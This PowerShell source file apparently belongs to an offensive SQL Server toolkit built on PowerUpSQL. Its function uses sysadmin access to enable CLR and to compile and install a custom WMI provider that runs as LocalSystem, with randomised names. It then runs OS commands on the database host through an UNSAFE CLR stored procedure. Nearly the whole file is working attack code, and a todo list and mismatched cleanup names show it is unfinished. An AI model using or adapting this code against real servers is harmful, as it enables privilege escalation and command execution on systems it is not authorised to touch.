# todo
<#
Note: dependant on PowerUpSQL.
- have script accept command or source script as string
    --- have that get bake into the wmi provider method
    --- update the wmi method to execute the provided string as a script block
    --- mod the clr to return the output of the wmi command
- roll into clone of the invoke-sqloscmdclr function so it can scale
- remove wmi cs and dll on client
- remove sql dll cs and dll on client
- deregister sp on sql server 
- deregister assembly on sql server
- deregister wmi and remove .dll from sql server
- dynamically find the installutil.exe, it is currently hardcoded
- update variables to make more sense
- work through .net version issues.
#>

# ----------------------------------
#  Invoke-SQLOSCmdCLRWMIProvider
# ----------------------------------
# Author: Scott Sutherland and Alexand Leary
Function  Invoke-SQLOSCmdCLRWMIProvider
{
    <#
            .SYNOPSIS
            This registers a CLR assembly, that registers a custom WMI provider, 
            then the clr assembly will run the custom method.  The method accept a string
            that is executed as a runspace script block. 
            Supports threading, raw output, and table output.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .PARAMETER Threads
            Number of concurrent threads.
            .PARAMETER Command
            Operating command to be executed on the SQL Server.
            .PARAMETER RawResults
            Just show the raw results without the computer or instance name.
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLOSCmdCLR -Verbose -Command "whoami"
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'OS command to be executed.')]
        [String]$Command,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Just show the raw results without the computer or instance name.')]
        [switch]$RawResults
    )

    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object -TypeName System.Data.DataTable
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')
        $null = $TblResults.Columns.Add('CommandResults')


        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC)
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }
            else
            {
                # Create connection object
                $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try
            {
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }

                # Switch to track CLR status
                $DisableShowAdvancedOptions = 0
                $DisableCLR = 0

                # Get sysadmin status
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

                # Check if CLR is enabled
                if($IsSysadmin -eq 'Yes')
                {
                    Write-Verbose -Message "$Instance : You are a sysadmin."
                    $IsCLREnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value
                }
                else
                {
                    Write-Verbose -Message "$Instance : You are not a sysadmin. This command requires sysadmin privileges."

                    # Add record
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'No sysadmin privileges.')
                    return
                }

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1

                    # Try to enable Show Advanced Options
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsShowAdvancedEnabled2 = Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsShowAdvancedEnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled Show Advanced Options."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable Show Advanced Options.')
                        return
                    }
                }

                # Enable CLR if needed
                if ($IsCLREnabled -eq 1)
                {
                    Write-Verbose -Message "$Instance : CLR is already enabled."
                }
                else
                {
                    Write-Verbose -Message "$Instance : CLR is disabled."
                    $DisableCLR = 1

                    # Try to enable CLR
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsCLREnabled2 = Get-SQLQuery -Instance $Instance -Query 'sp_configure "CLR Enabled"' -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property config_value -ExpandProperty config_value

                    if ($IsCLREnabled2 -eq 1)
                    {
                        Write-Verbose -Message "$Instance : Enabled CLR."
                    }
                    else
                    {
                        Write-Verbose -Message "$Instance : Enabling CLR failed. Aborting."

                        # Add record
                        $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Could not enable CLR.')

                        return
                    }
                }

                # -----------------------------------
                # Setup and Compile WMI Provider DLL
                # -----------------------------------

                # Status user
                Write-Verbose -Message "$Instance : Generating WMI provider C# Code"

                # Create random WMI name space
                $WMINameSpaceLen = (5..10 | Get-Random -count 1 )
                $WMINameSpace = (-join ((65..90) + (97..122) | Get-Random -Count $WMINameSpaceLen | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - WMI Provider name space: $WMINameSpace"

                # Create random WMI class name                                        
                $WMIClassLen = (5..10 | Get-Random -count 1 )
                $WMIClass = (-join ((65..90) + (97..122) | Get-Random -Count $WMIClassLen | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - WMI Provider class: $WMIClass"

                # Create random WMI method name
                $WMIMethodLen = (5..10 | Get-Random -count 1 )        
                $WMIMethod = (-join ((65..90) + (97..122) | Get-Random -Count $WMIMethodLen | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - WMI Provider Method: $WMIMethod "

                # Create random WMI provider file name
                $WmiFileNameLen = (5..10 | Get-Random -count 1 )                                        
                $WmiFileName = (-join ((65..90) + (97..122) | Get-Random -Count $WmiFileNameLen | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - WMI Provider file name: $WmiFileName.dll"

                # Define WMI provider code
                $WMICS = "
                using System;
                using System.Collections;
                using System.Management;
                using System.Management.Instrumentation;
                using System.Runtime.InteropServices;
                using System.Configuration.Install;

                [assembly: WmiConfiguration(@`"root\cimv2`", HostingModel = ManagementHostingModel.LocalSystem)]
                namespace $WMINameSpace
                {
                    [System.ComponentModel.RunInstaller(true)]
                    public class MyInstall : DefaultManagementInstaller
                    {
                        //private static string fileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;

                        public override void Install(IDictionary stateSaver)
                        {
                            try
                            {
                                new System.EnterpriseServices.Internal.Publish().GacInstall(`"$WmiFileName.dll`");
                                base.Install(stateSaver);
                                RegistrationServices registrationServices = new RegistrationServices();
                            }
                            catch { }
                        }

                        public override void Uninstall(IDictionary savedState)
                        {

                            try
                            {
                                new System.EnterpriseServices.Internal.Publish().GacRemove(`"$WmiFileName.dll`");
                                ManagementClass managementClass = new ManagementClass(@`"root\cimv2:Win32_$WMIClass`");
                                managementClass.Delete();
                            }
                            catch { }

                            try
                            {
                                base.Uninstall(savedState);
                            }
                            catch { }
                        }
                    }

                    [ManagementEntity(Name = `"Win32_$WMIClass`")]
                    public class $WMIClass
                    {
                        [ManagementTask]
                        public static string $WMIMethod(string command, string parameters)
                        {

                            // Write a file to c:\temp\doit.txt using wmi
                            object[] theProcessToRun = { `"c:\\windows\\system32\\cmd.exe /C \`"echo testing123$WMIMethod > c:\\temp\\doit.txt \`"`" };
                            ManagementClass mClass = new ManagementClass(@`"\\`" + `"127.0.0.1`" + @`"\root\cimv2:Win32_Process`");
                            mClass.InvokeMethod(`"Create`", theProcessToRun);

                            // Return test script
                            return `"test`";
                        }
                    }
                }"

                # Write c sharp code to a file
                $OutDir = $env:temp
                $OutFileName = $WmiFileName 
                $OutFilePath = "$OutDir\$OutFileName.cs"
                Write-Verbose -Message "$Instance : Writing WMI provider code to: $OutFilePath"
                $WMICS | Out-File $OutFilePath

                # Identify the path to csc.exe
                Write-Verbose -Message "$Instance : Searching for .net framework v3 csc.exe" 
                $CSCPath = Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | where {$_.FullName -like "*v3*" -and $_.fullname -like "*Framework64*"} | Select-Object fullname -First 1 -ExpandProperty fullname
                if(-not $CSCPath){
                    Write-Verbose -Message "$Instance : No csc.exe found."
                    return
                }else{
                    Write-Verbose -Message "$Instance : Found csc.exe: $CSCPath"
                }

                # Compile the .cs file to a .dll using csc.exe
                $CurrentDirectory = pwd
                cd $OutDir
                $Command = "$CSCPath /target:library /R:system.configuration.install.dll /R:system.enterpriseservices.dll /R:system.management.dll /R:system.management.instrumentation.dll " + $OutFilePath        
                Write-Verbose -Message "$Instance : Compiling WMI provider code to: $OutDir\$OutFileName.dll"
                $Results = Invoke-Expression $Command
                cd $CurrentDirectory
                $WMIFilePath1 = "$OutDir\$OutFileName.dll"

                # ------------------------------------
                # Setup and Compile SQL Server CLR DLL
                # ------------------------------------

                Write-Verbose -Message "$Instance : Converting WMI provider DLL to base64"

                # Read the DLL into a byte array
                $FileBytes = [System.IO.File]::ReadAllBytes("$WMIFilePath1")

                # Convert the byte array in the a Base64 string
                $FileBytes64 = [Convert]::ToBase64String($FileBytes);

                # Remove dll and cs files - pending

                Write-Verbose -Message "$Instance : Generating SQL Server CLR C# Code"

                # Define random variables for the clr
                $AssemblyLength = (5..10 | Get-Random -count 1 )                                        
                $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $AssemblyLength | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - SQL CLR Assembly Name: $AssemblyName.dll"

                $ClassNameLength = (5..10 | Get-Random -count 1 )
                $ClassName = (-join ((65..90) + (97..122) | Get-Random -Count $ClassNameLength | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - SQL CLR ClassName: $ClassName"

                $MethodNameLength = (5..10 | Get-Random -count 1 )
                $MethodName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - SQL CLR MethodName: $MethodName"

                $ProcNameLength = (5..10 | Get-Random -count 1 )
                $ProcName = (-join ((65..90) + (97..122) | Get-Random -Count $ProcNameLength | % {[char]$_}))
                Write-Verbose -Message "$Instance :  - SQL CLR Proc Name: $ProcName"

                # Define SQL Server CLR Assembly Code
$TemplateCmdExec = @"
                using System;
                using System.Data;
                using System.Data.SqlClient;
                using System.Data.SqlTypes;
                using Microsoft.SqlServer.Server;
                using System.IO;
                using System.Diagnostics;
                using System.Text;
                using System.Collections.Generic;
                using System.Management;

                public partial class $ClassName
                {
                    [Microsoft.SqlServer.Server.SqlProcedure]
                    public static void $MethodName (SqlString execCommand)
                    {
                        // Check for local administrator privileges - pending    

                        // Convert Base64 to byte array 
                        byte[] MyByteArray2 = Convert.FromBase64String("$FileBytes64");							
			
                        // Write all bytes to another file
                        File.WriteAllBytes("c:\\windows\\system32\\wbem\\$WmiFileName.dll",MyByteArray2);

                        // Create new process to install the wmi provider
                        Process proc = new Process();
                        proc.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe";
                        proc.StartInfo.Arguments = string.Format(@" c:\\windows\\system32\\wbem\\$WmiFileName.dll", execCommand.Value);
                        proc.StartInfo.UseShellExecute = false;
                        proc.StartInfo.RedirectStandardOutput = true;
                        proc.Start();

                        // Execute custom wmi method from custom wmi class via wmi using c sharp
                        ManagementClass mClass = new ManagementClass(@"\\" + "127.0.0.1" + @"\root\cimv2:Win32_$WMIClass");
                        object results = mClass.InvokeMethod("$WMIMethod", null);

                        // Test getting process list - multiple line output reading
                        // ManagementClass c = new ManagementClass("Win32_Process");
                        // StringBuilder builder = new StringBuilder();
                        // foreach (ManagementObject o in c.GetInstances())
                        // builder.Append(o).AppendLine(o["Name"].ToString());    
                          
                        // Create the record and specify the metadata for the columns.
	                    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	                    // Mark the begining of the result-set.
	                    SqlContext.Pipe.SendResultsStart(record);

                        // Set values for each column in the row
	                    record.SetString(0, results.ToString());

	                    // Send the row back to the client.
	                    SqlContext.Pipe.SendResultsRow(record);

	                    // Mark the end of the result-set.
	                    SqlContext.Pipe.SendResultsEnd();

                        proc.WaitForExit();
                        proc.Close();                                              

                        // Remove provider - pending

                        // Remove dll - pending
                    }
                };
"@

                # Write out the cs code
                $ClrFileNameLen = (5..10 | Get-Random -count 1 )                                        
                $ClrFileName = (-join ((65..90) + (97..122) | Get-Random -Count $ClrFileNameLen | % {[char]$_}))
                $SRCPath = $OutDir + "\$ClrFileName.cs"
                Write-Verbose -Message "$Instance : Writing SQL Server CLR code to: $SRCPath" 
                $TemplateCmdExec | Out-File $SRCPath

                # Setup and compile the dll
                $CurrentDirectory = pwd
                cd $OutDir
                $Command = "$CSCPath /target:library " + $OutDir + "\$ClrFileName.cs"
                Write-Verbose -Message "$Instance : Compiling SQL Server CLR code to: $OutDir\$ClrFileName.dll"
                $Results = Invoke-Expression $Command
                cd $CurrentDirectory

                # --------------------------------------
                # Install and CLR DLLs on the SQL Server
                # --------------------------------------

                # Register system.management.dll w
                # Note: This is required for the C Sharp CLR to call WMI
                Write-Verbose -Message "$Instance : Registering assembly system.management.dll on SQL Server instance"
                $stringBuilder0 = New-Object -Type System.Text.StringBuilder            
                $null = $stringBuilder0.AppendLine("CREATE ASSEMBLY [system.management]")            
                $null = $stringBuilder0.AppendLine("from 'C:\windows\Microsoft.NET\Framework\v4.0.30319\System.Management.dll'")            
                $null = $stringBuilder0.AppendLine("with permission_set = unsafe")            
                $stringBuilder0cmd= $stringBuilder0.ToString() -join ""                
                $Result0 = Get-SQLQuery -ReturnError -Instance $Instance -Query $stringBuilder0cmd -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database msdb

                # Set paths to CLR dll
                $assemblyFile = "$OutDir\$ClrFileName.dll"

                # Generate TSQL CREATE ASSEMBLY string
                Write-Verbose -Message "$Instance : Generating CREATE ASSEMBLY TSQL from SQL Server CLR DLL"
                $stringBuilder1 = New-Object -Type System.Text.StringBuilder
                $stringBuilder1.Append("CREATE ASSEMBLY [") > $null
                $stringBuilder1.Append($AssemblyName) > $null
                $stringBuilder1.Append("] AUTHORIZATION [dbo] FROM `n0x") > $null
                $fileStream = [IO.File]::OpenRead($assemblyFile)
                while (($byte = $fileStream.ReadByte()) -gt -1) {
                    $stringBuilder1.Append($byte.ToString("X2")) > $null
                }
                $fileStream.Close()
                $fileStream.Dispose()
                $null = $stringBuilder1.AppendLine("`nWITH PERMISSION_SET = UNSAFE")            
                $stringBuilder1cmd= $stringBuilder1.ToString() -join ""

                # Execute CREATE ASSEMBLY string
                Write-Verbose -Message "$Instance : Executing CREATE ASSEMBLY TSQL on SQL Server"
                $Result1 = Get-SQLQuery -ReturnError -Instance $Instance -Query $stringBuilder1cmd -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database msdb

                # Create CREATE PROCEDURE string
                Write-Verbose -Message "$Instance : Generating CREATE PROCEDURE TSQL"
                $stringBuilder2 = New-Object -Type System.Text.StringBuilder            
                $null = $stringBuilder2.AppendLine("CREATE PROCEDURE [dbo].[$ProcName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$AssemblyName].[$ClassName].[$MethodName];")            
                $stringBuilder2cmd= $stringBuilder2.ToString() -join ""

                # Execute CREATE PROCEDURE string
                Write-Verbose -Message "$Instance : Executing CREATE PROCEDURE TSQL on SQL Server"
                $Result2 = Get-SQLQuery -ReturnError -Instance $Instance -Query $stringBuilder2cmd -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database msdb

                # Create execute procedure string
                Write-Verbose -Message "$Instance : Generating exec statement for CLR sp in TSQL"
                $stringBuilder3 = New-Object -Type System.Text.StringBuilder
                $null = $stringBuilder3.AppendLine("EXEC[dbo].[$ProcName] 'whoami'")                    
                $stringBuilder3cmd= $stringBuilder3.ToString() -join ""        

                # Execute sp string
                Write-Verbose -Message "$Instance : Executing CLR sp on SQL Server (which will install the custom wmi provider and run the target wmi method)"
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $stringBuilder3cmd -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database msdb                   

                # Status user
                Write-Verbose -Message "$Instance : Dest WMI filename on sql server: c:\windows\system32\wbem\$WmiFileName.dll"
                Write-Verbose -Message "$Instance : manual wmic command: invoke-wmimethod -class Win32_$WMIClass -Name $WMIMethod"


                # Execute OS command
                # $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB" | Select-Object -Property output -ExpandProperty output

                # Display results or add to final results table
                if($RawResults)
                {
                    [string]$CmdResults.output  
                }
                else
                {
                    $null = $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults.output)
                }

                # Remove procedure and assembly
                Get-SQLQuery -Instance $Instance -Query "DROP PROCEDURE cmd_exec" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB"
                Get-SQLQuery -Instance $Instance -Query "DROP ASSEMBLY cmd_exec" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -Database "MSDB"
                #>

                # Restore CLR state if needed
                if($DisableCLR -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling CLR"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'CLR Enabled',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Restore Show Advanced Options state if needed
                if($DisableShowAdvancedOptions -eq 1)
                {
                    Write-Verbose -Message "$Instance : Disabling Show Advanced Options"
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',0;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose()
            }
            catch
            {
                # Connection failed

                if(-not $SuppressVerbose)
                {
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose -Message "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblResults
    }
}
